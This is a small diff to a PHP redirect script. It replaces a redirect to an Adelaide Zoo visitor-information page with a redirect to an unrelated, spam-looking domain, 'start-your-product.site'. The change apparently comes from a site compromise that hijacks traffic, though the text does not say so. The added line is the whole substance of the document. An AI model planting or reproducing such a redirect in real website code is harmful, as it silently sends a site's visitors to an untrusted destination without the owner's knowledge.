@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.adelaidezoo.com.au/visitor-information/adelaide-zoo-gardens/");
+header("Location: https://start-your-product.site/actmca/");
 die();
 ?>
